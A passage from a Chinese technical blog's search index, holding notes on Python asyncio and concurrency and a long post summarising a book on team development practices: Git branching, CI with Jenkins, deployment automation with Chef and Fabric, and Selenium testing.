任务时，要主动交出控制权；在 js 里，很多库都是默认异步编写的，因此不容易忘记这个事情。但是在 python 里面，很多库并非天生异步，例如常用的 requests，此时很有必要提高警惕； 当协程获得控制权，处于运行中的状态时，它是无法被取消的。因为只有一个线程，当它在运行时，意味着想要取消它的代码并没有在运行；仅当协程位于队列中，处于等待状态时，才有可能被取消；此时取消它的代码有可能获得了控制权； asyncio.run() 函数，做为所有协程运行代码的入口； asyncio.create_task()，在当前协程中，创建一个新的协程；可基于返回的 task 对象，对新建的协程进行控制； await coro()，调用 coro，并同步等待它返回结果； 调用 coro() 时，并不意味着 coro 的代码会马上执行，而只是表示将它加入了队列，实际的执行时间取决于事件循环的高度器； 跟 js 一样，await 关键字必须用在 async 定义的函数中；当函数用 async 定义时，它是一个协程；每次对该函数的调用，都是都它加入事件循环的队列中；而 await 表示交给当前协程对 CPU 的使用，即停止运行，让调度器去运行其他协程；等 await 的事件结束时，调度器会重新安排它运行； GIL 的真实影响各种处理网络请示的库，如 requests，在发起请示后，会释放当前线程的 GIL，以便其他线程可以抢占；但如果只有一个线程，那么抢占并没有意义。仅在多线程时，抢占才有意义；而且即使抢占成功，后续 requests 仍然会再次被分配 GIL，但此时它有可能仍然还没有取得响应，因此会浪费掉一些性能；但总的来说，多线程有助于提高 I&#x2F;O 的并发处理能力；但不适用于 CPU 密集型的任务，性能反而变差，因为 CPU 不断在多个线程之间切换，但每次只运行一个线程，最终的性能还不如顺序执行来得快； 另外还有一些库的设计是异步的，但如果当前的代码不是 async 的话，貌似也无法使用 await 来交出控制权？ 当处理计算密集型任务，因为 GIL 的存在，多线程是没有意义的，因为每次只有一个线程在工作；反而不如使用单线程来得简单和高效；如果有多核，则可以考虑使用多进程模式来提高效率； 第20章 Concurrent Executorsconcurrent.futures 库里面，有两个类，分别是 ThreadPoolExecutor 和 ProcessPoolExecutor，它们可以很方便的使用线程或者进程来实现并发； 对使用者来说，背后的线程或进程是透明的，它会自动开启多线程或进程，同时创建任务队列，收集各线程的处理结果； Python 里面的 futures 有点像 js 里面的 promise；但 futures 一般不直接创建，而是交由框架来创建；开发者可以在更高的抽象维度来使用它，这样可以避免错误使用； future.done() 方法可用来查询是否计算完成了，但更常见的做法是不查询，而是等待通知，即完成后，调用回调函数即可； future 有个 add_done_callback 方法，它接受一个回调函数做为参数；注意：该回调函数，将在运行该 future 的线程或进程中直接运行； future.result() 方法可用于获取计算结果；但 concurrency 和 asyncio 两个库对方法的实现有所不同；concurrency 调用 result 方法时，会造成堵塞，等待结果的返回；同时支持 timeout 参数，超时未返回时，会抛出异常；asyncio 则不支持 timeout 方法，但支持 await 关键字，这样不会造成堵塞； concurrency 还有一个 as_completed 方法，专门用来读取 result，以避免堵塞， executor.map() 主要用于一个函数，并发处理多个不同的参数 executor.submit() 则更灵活一些，多个不同的函数，并处理各自不同的参数；最后通过 as_completed 方法收集计算结果； 第21章 异步编程 虽然可以通过 async def 来定义异步函数，但是如果函数体中包含一些非异步的操作，比如将文件写入本地，貌似该同步操作有可能会造成堵塞，占用整个线程，直到写入成功？经查证，发现确实如此，在异步函数中，只要有任意一个 其他海象符 :&#x3D;，为了省写一行代码，先检查，确认有值后，再赋值；没值的话，就不赋值 12345678910111213# 没有海象符的时候name = abc.get(&quot;name&quot;)if name: # doAelse: # doB # 有海象符后if name := abc.get(&quot;name&quot;): # doAelse: # doB","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"高效团队开发","slug":"高效团队开发","date":"2016-11-04T07:10:00.000Z","updated":"2024-09-21T12:05:22.004Z","comments":true,"path":"2016/11/04/高效团队开发/","permalink":"http://example.com/2016/11/04/%E9%AB%98%E6%95%88%E5%9B%A2%E9%98%9F%E5%BC%80%E5%8F%91/","excerpt":"","text":"1. 什么是团队开发待解决的问题 “谁”“到何时为止”做了“什么事情”，“怎样”算做“完成”等； 在团队内部共享代码等各类工作成果； 保证各成员能够利用工作成果并行作业，同时防止工作成果遭到破坏； 在团队中共享从项目中学到的知识； 证明开发出的软件，在任何时间都是可以正常运行的； 构建自动化的工作流程，确保任何人都可以正确的开发、测试和发布； 如何解决问题 版本管理 缺陷管理 持续集成 持续交付 回归测试 2. 团队开发中的问题重要的邮件太多，无法确定处理的优先顺序使用邮件交流问题并不是一个好的方法，因为邮件算不上一种格式化的数据，很难归类整理； 解决方法：使用版本缺陷系统进行问题的管理； 没有能用于验证的环境如果没有用于验证的环境，将导致每次复现 BUG 需要花费很长的时间，导致效率很低； 解决方法：搭建多个环境，分别用于开发、验证、测试、发布等； 用别名目录管理分支用于实现谁、何时、做了什么样的修改； 重新制作数据库比较困难数据库的变更操作也应纳入版本系统进行管理，确保每次的操作内容、顺序在各个环境都是一致的，而不是各个开发环境执行自己的； 不运行系统就无法察觉的问题测试时，需要确保将全员的代码集中到一起运行，以免发生退化； 解决方案：持续集成，每次提交新代码，就合并代码并自动化测试，在第一时间暴露问题； 覆盖了其他组员修正的代码当合并其他成员的代码时，如果出现冲突，有些开发人员可能直接将其他成员的代码进行覆盖，导致出现问题； 解决方案：持续集成； 无法自信的地进行代码重构缺少措施避免出现退化； 解决方案：自动化测试； 不知道 BUG 的修正日期，也不能追踪退化缺少缺陷跟踪系统，导致需要从一堆邮件中查询当时的情况； 解决方案：CI、缺陷跟踪、版本管理三个工具是确保项目高效开发的神器；甚至还应该考虑使用自动化部署； 没有灵活使用分支和标签导致合并的时候容易出现混乱；有时在切换分支修复某些 BUG，切换回新功能分支时，忘了合并刚才的 BUG 分支； 在测试环境、正式环境上无法运行缺少统一管理第三方模块，确保在各个环境的依赖实现一致性的办法； 解决方案： docker； 发布太复杂，以至于需要发布手册涉及如何更新DDL、依赖的库以及配置文件； 解决方案：持续交付； 3. 版本管理系统Git 等分布式版本管理系统 优点 能将代码完整地复制到本地 运行速度快 临时作业的提交易于管理 分支、合并简单方便 可以不受地点的限制进行协作开发 缺点 系统中没有真正意义上的最新版本 没有真正意义上的版本号 工作流程的配置过于灵活，容易产生混乱 有一定的学习成本 需纳入版本管理的内容 代码 需求定义和设计等文档 库的依赖 数据库初始化命令 环境配置文件 标签Git 的每次提交有一个唯一识别码，但是它比较难记，为了让它更具备可识别性，可以为该提交添加标签，通过标签来识别； 虽然分支也可以使用标签，但我发现好像并不是很有必要，貌似直接用分支名就够了； 工作模式中央集权型工作流 Github 型工作流 分支策略模式Git-flow 主分支 master：为发布而建的分支，每次发布时都打上标签 develop：开发用的分支，发布前的最新版本 临时分支 feature：分离自 develop，开发特定功能的分支 release：分离自 develop，为发布做准备的分支，避免混入多余的 feature； hotfix：分离自 master，修复 master 分支的故障；修复后，需要被合并到 master\\develop\\release 三个分支； 有专门的 git-flow 脚本实现以上的管理模式；git-flow 的缺点是有些复杂，需要学习适应一下；同时不支持 GUI 可视化工具； Github-flowgit-flow 的优点是非常清晰可靠，缺点是看上去有点复杂不易理解，因此产生了 github-flow 模式来降低学习成本； Github-flow 流程 master 分支的内容都可以进行发布； 添加内容时，直接从 master 分支新建分支 建立的分支在本地环境上提交，并以同名的分支定期向远程代码库进行 push 开发结束后向 master 分支发送 pull request pull request 在被审核通过后，合并到 master，并从 master 向正式环境发布； Jenkins 可以监控仓库中中的所有分支，这样每个分支 push 到仓库后，都会触发自动构建和测试，确保代码没有问题； 数据库模式和数据的管理问题发生的原因在于如果不同的开发人员，在设置数据库初始化的命令顺序上面，可能存在冲突，导致一些功能无法正常运行； 数据库版本管理的必要条件 在任意环境中，都能使用相同的步骤来构建数据库 能够反复执行多次 格式为文件 数据库迁移基本原理：将数据库初始化需要用的 SQL 命令写入文件，这些文件按数字进行顺序命令，每次启动程序时，按照这些文件进行数据库初始化； 由于是分布式开发，每个开发人员新添加的 SQL 文件可能存在命名冲突，当合并分支时，Git 会报错，此时需要解决冲突，并再次提效修改后的版本；由于修改后的版本是最新版本，因此其他人在合并该版本时，会自动覆盖其本地的版本，因此，仍然能够实现正确的初始化； SQL 文件中的初始化命令是成对出现的，它提供了回滚机制，当出现冲突时，先回滚当前的数据库，再按照最新的版本，重新初始化； 由于冲突是通过手工合并 SQL 命令来解决的，因此不可避免存在错误的可能性，此时就需要通过增加测试代码，来确保万无一失； 配置文件的管理配置文件包括环境变量、密码等信息，这些信息不适合纳入版本管理，因此需要单独上传部署的服务器，此时可以通过编写一个部署脚本，来实现自动上传；而上传的信息，同样可以写在配置文件中，而脚本本身可以纳入版本管理； 常用部署的工具：Chef, Puppet, Capistrano, Fabric, ServerSepc； 依赖关系的管理大多数语言都有自己的依赖管理工具和公共仓库，例如 Java 的 Maven，Node 的 npm，Python 的 Pypi 等； 这些现成的工具的原理： 设置一个中央仓库； 使用一个文件来定义对库的依赖； 执行上述依赖文件的脚本； 4. 任务管理任务管理系统的优点 “有须做什么”的任务定义 “谁来做”的职责分配 “什么时候完成”的期限管理 “作业中或已完成”的状态管理 其他优点 直观性 方便检索 对信息统一管理及共享 能够生成各类报表 能够与其他系统进行关联，具备可扩展性； 任务驱动开发将新功能或者 BUG 任务登记在缺陷管理系统中，每次代码的提交，都与某一个具体的任务单相对应，禁止没有任务单号的提交； 通过设置 Github 的 Webhook，可以实现将 commit 和相应的任务单进行关联； 开发新功能、修改BUG的工作流程 建立任务单 指定责任人 开发 提交：提交的时候，记得标注对应哪个问题单号；这样可以通过问题单，查询到代码修改了哪些内容、什么时候修改的；也可以反向查询，即找到当前代码的修改，对应到哪些问题单，从而知道当时什么要做如此的修改； Push 到代码库 管理对象 epic story task bug 其他Redmine 安装123456789101112131415161718192021222324252627282930version: &#x27;3.7&#x27;services: redmine: image: redmine restart: always ports: - 8080:3000 environment: REDMINE_DB_POSTGRES: db REDMINE_DB_PASSWORD: secret REDMINE_DB_USERNAME: redmine networks: redmine-network: depends_on: - db db: image: postgres restart: always environment: POSTGRES_PASSWORD: secret POSTGRES_USER: redmine networks: redmine-network:networks: redmine-network: Redmine 访问localhost:8080 5. CI 持续集成主要的 CI 工具 Jenkins：插件众多，可配置性强；缺点是上手成本高； Travis：需要配合 Github 使用，优点是上手简单； build 工具以 Java 为例，常用的构建工具有： Maven：适用于新项目； Ant：适用于已开发一半的项目； 测试代码的写法常见的测试类型： 单元测试 集成测试 用户验收测试 回归测试 编写测试代码是要付出时间成本的，理想的情况下当然是覆盖以上所有的测试场景；如果不允许，则应至少包括单元测试和集成测试； 棘手的测试 和外部系统有交互的测试 使用 mock 框架进行测试 使用内存数据进行测试：可避免跟数据库中的数据产生耦合；常用工具如 H2 数据库； UI 相关的测试 Jenkins 使用流程 新建任务：一个任务对应一个项目； 下载代码：将 Github 代码地址与项目进行关联，并设置 Github 的 Webhook，在收到 push 请求后，调用 Jenkins 接口拉取最新的代码； 自动执行 Build 和测试：制作一个构建的脚本，并由 Jenkins 进行调用即可；脚本中需设置退出值，以便 Jenkins 判断任务的执行是失败还是成功； 统计结果并生成报表：使用 JUnitXML 形式输出报表有更好的通用性和直观性，虽然它是 JUnit 设定的格式，但其他语言也有相应的库可以生成该格式的报表； 统计覆盖率：常用的覆盖率统计工具有 Cobertura, Jacoco, Scct, simpleCov, Rcov 等（Cobertura 已于 2011 年停止了开发）； 静态分析：常用工具 Checkstyle, PMD, Findbugs等； 配置通知：对构建结果进行通知，选择常用插件即可，支持邮件、Twitter、IRC、XFD等； 构建失败的惩罚设计一个搞笑的仪式，例如警报灯闪烁、弹射球、戴礼帽等； 当构建发生失败时，基于该构建的分支之后编写的代码，将需要禁止提交，直到构建修复成功为止；为了避免出现这种等待的情况，可考虑使用 Github flow 中的 pull request 流程；当收到 pull request 后会自动进行构建，如果成功，则合并到主分支；如果失败，则不合并； 以上功能在 Jenkins 中需要使用 Github pull request builder 插件实现； 确保可追溯性通过相应的插件，可实现 Jenkins 和 缺陷管理系统的任务单相关，并可以方便的查看每次代码提交的差异； 6. 自动化部署–持续交付由谁负责由想实施部署自动化的人着手去做即可，因此一般来说是运维人员牵头； 前提条件 全部团队成员都采用版本管理； 所有的环境使用相同的方式构建； 实现发布工作的自动化，并事先进行验证 要反复多次进行测试 工具链 引导：服务器 OS 的配置自动化； 配置：服务器及中间件的配置自动化； 业务流程：代码部署及发布的自动化； 引导Kickstart原理：安装 Linux 时，给内核参数加上 ks&#x3D;&lt;…&gt; 选项，即可开启从外部设备加载配置文件，实现安装自动化；背后的本质是将安装过程中的选项，以配置文件的形式提前写好； 仅适用于 RHEL 系统的 Linux 系统，不适用于 Debian 系列； Vagrant用途：用来创建和配置虚拟环境，可以最大化的利用单台机器的性能； 配置应用程序总是运行在一定的进程环境中，复杂的应用程序，可能涉及非常多的环境配置选项，从而带来很大的工作量； Chef根据提前写好的配置规则（cookbooks），让服务器安装软件包和配置中间件，实现自动化； 可以为应用服务器和数据库服务器分别编写 cookbook，这样就能够复制搭建服务器的步骤，实现批量化； Serverspec用途：一个测试框架，可对服务器的配置进行单元测试，确保服务器如预期的正常运行； 最佳实践1：使用虚拟环境 使用 Vagrant 创建干净的虚拟环境；（怀疑之处可考虑结合 docker 来创建虚拟环境）； 拉取 Chef 的 cookbook 和 Serverspec 的测试用例； 执行 Chef，完成服务器的配置； 执行 Serverspec，完成对服务器的状态测试，确保配置成功； 将结果反馈给 jenkins； 以上各个工具都有相应的替代器，因此无须局限于以上工具的使用，重点在于选择最适合团队使用的工具； 最佳实践2：使用物理机Kickstart + Chef + Serverspec 的组合； 与实践1的差别在于将 Vagrant 替换为 Kickstart； 发布自动化Capistrano Capistrano 使用 Push 的方式，无须在应用程序和数据库服务上面安装，只需执行服务器能够通过 SSH 登录前两种服务器即可； Fabric功能同 Capistrano，差别在于使用 Python，而非 Ruby；另外 Fabric 任务可以顺序执行，也可以并行，甚至还可以分组顺序执行，组内则是并行；相当灵活； JenkinsJenkins 同样可以用来实现发布的自动化，不过需要在从节点上安装 Jenkins 才行，还好只需能够 SSH 登录从节点，即可在主节点上远程进行安装； 相对于前面两个工具，Jenkins 的优点在于： 可视化的控制台； 可实现发布任务的权限管理 可查询发布的详细历史记录； 最佳实践组合使用 Jenkins + Fabric，这样既可以利用 Jenkins 的日志功能，又可以获得 Fabric 灵活易用的功能； 手动部署的工具如果可能，尽量所有部署工作设置为自动化；如果出现少数需要手动部署的特例，例如某台机器磁盘空间不足，则有以下工具可以使用： RLogin Tera Term 以上两个工具可以实现一个终端输入，在多台机器上实施相同操作的效果； 当机器数据很多时，有时可能存在少数几台机器的命令执行不成功，此时在执行下一条指令前，应先就上一条指令的结果进行验证，确保无误后，再执行下一条指令； 其他相关问题不中断服务的部署方法蓝绿部署原理：将机器分成两组，先部署其他的一组，成功后，再部署剩下的一组； 缺点：部署过程中会暂停一半的机器资源，会给系统带来比较大的压力，除非增加备用机器，但那样做的成功过高； 云蓝绿部署原理：机器不分组，部署前增加一批新机器进行部署，部署成功后，删除旧机器； 该方法克服了传统蓝绿部署的缺点，但会增加复杂性和出错概率，因为务必要先实现部署的自动化和自动测试； 回滚部署失败不可避免，因此应随时有回滚的机制，包括代码回滚、数据库回滚两种； 回滚时，除了回滚源代码外，还应以服务器的环境进行验证，确保可用；同时还需考虑数据库的迁移； 数据库的回滚分为两种情况，一种是允许新数据的丢弃，一种是不允许；后一种情况比较麻烦，因此，在发布新代码前，应分成两步进行测试，先确保只更新数据库的情况下，旧代码能够顺利进行；之后再进行新代码的发布；此时如果出现问题，也只需回滚代码部分，无须回滚数据库部分； PasS自动化部署需要花费一定的学习和时间成本，因此也有一个选项是考虑使用 PasS 服务；只需 push 代码到相应的平台，即可实现自动化部署； PasS 适用场景 没有足够资源，但希望快速推出产品，收集反馈的项目；（创新项目） 无法预测峰值负荷的服务；（新上线的手机游戏） 生命周期短的服务（例如展会）； 与现有产品进行配合的小项目； PasS 缺点 当流量很大时，费用成本出现不成比例的上升； 有时难以获得想要的日志进行问题分析； 获得的服务等级和合同约定可能不相符； 7. 回归测试回归测试 SeleniumSelenium 并不是单个软件，而是一套工具集； 几个常用的 Selenium 工具Selenium IDE以 Firefox 的插件形式出现，可以录制键盘和鼠标动作，因此对于非技术人员依然非常友好； Selenium Remote Control在测试脚本和浏览器之间，增加了一个服务器作为中间层；由于这个抽象层后，可以使用各种语言编写测试脚本，使得测试更加灵活，例如可以实现循环和分支等； Selenium WebDriver出于安全考虑，主流的浏览器都会对 Javascript 的调用进行限制，WebDriver 的目标即是绕开这些限制，实现调用 OS 的原生接口；在结合 Selenium 后，推出了 Selenium2； 制作测试用例测试由测试用例组成，多个测试用例可以组合一个测试组；测试组内部的用例是顺序执行的；而测试组之间则是并发执行的；好的测试应该能够尽量缩短测试时间，因此，应考虑将测试用例设计成可以并行测试的模式；好的测试组之间不应相互依赖； 由于测试用例的执行是代码级别的速度，而网页的加载则跟网速有关，因此 Selenium的自动化测试会容易出现失败；解决办法在于执行下一条指令前，应对上一条指令的结果进行确认；如果确认失败，应该重复上一条指令；如果确认成功，再开始执行下一条指令； Jenkins 和 Selenium 的协作安装相应的插件，然后配置好相应的参数即可； Selenium 测试的高速化 利用 Jenkins 的分布式机制，设置主从节点，通过启动多个浏览器，实现并发测试； 为每个浏览器客户端匹配相应的应用程序服务器，实现服务端测试的负载均衡（不太理解为什么不使用 nginx 之类的工具来实现，而是改动 hosts 文件） 多个应用程序版本的测试通过 Jenkins 的 Parameterized Trigger plugin”插件，可实现对指定版本进行测试； 使用 Git 拉取相应版本的测试用例时，需要配置插件选项，为每个版本生成相应的目录，避免不同版本的测试用例混在一起； 8. 实践在 Github 上面新建一个项目拉取该项目的代码到本地初始化 package.jsonnpm install 安装依赖简单写一些代码，实现 hello world运行代码，确保顺利写一些单元测试代码写测试脚本设置测试脚本的文件为可执行推送代码到 Github登录生产服务器，新增用户，安装git，拉取代码，安装依赖，运行应用登录 Jenkins 服务器，新增用户，安装 Jenkins，启动 Jenkins配置 jenkins，安装插件，更改密码，新建任务，配置构建脚本；配置 Github 的 Webhooks，以便 push 后触发 Jenkins 的构建；生成 SSH-KEY，将公钥存放到应用程序服务器，开放存放文件夹的访问权限；创建部署文件夹，创建部署的自动化脚本，设置脚本为可执行","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"项目管理","slug":"项目管理","permalink":"http://example.com/tags/%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/"}]}],"categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"渲染","slug":"渲染","permalink":"http://example.com/tags/%E6%B8%B2%E6%9F%93/"},{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"},{"name":"服务器","slug":"服务器","permalink":"http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"kubernetes","slug":"kubernetes","permalink":"http://example.com/tags/kubernetes/"},{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"},{"name":"安全","slug":"安全","permalink":"http://example.com/tags/%E5%AE%89%E5%85%A8/"},{"name":"逆向","slug":"逆向","permalink":"http://example.com/tags/%E9%80%86%E5%90%91/"},{"name":"Dart","slug":"Dart","permalink":"http://example.com/tags/Dart/"},{"name":"前端","slug":"前端","permalink":"http://example.com/tags/%E5%89%8D%E7%AB%AF/"},{"name":"数据库","slug":"数据库","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"图像处理","slug":"图像处理","permalink":"http://example.com/tags/%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/"},{"name":"Kubernetes","slug":"Kubernetes","permalink":"http://example.com/tags/Kubernetes/"},{"name":"网络","slug":"网络","permalink":"http://example.com/tags/%E7%BD%91%E7%BB%9C/"},{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"},{"name":"C","slug":"C","permalink":"http://example.com/tags/C/"},{"name":"操作系统","slug":"操作系统","permalink":"http://example.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"深度学习","slug":"深度学习","permalink":"http://example.com/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"},{"name":"微信","slug":"微信","permalink":"http://example.com/tags/%E5%BE%AE%E4%BF%A1/"},{"name":"docker","slug":"docker","permalink":"http://example.com/tags/docker/"},{"name":"设计","slug":"设计","permalink":"http://example.com/tags/%E8%AE%BE%E8%AE%A1/"},{"name":"项目管理","slug":"项目管理","permalink":"http://example.com/tags/%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/"}]}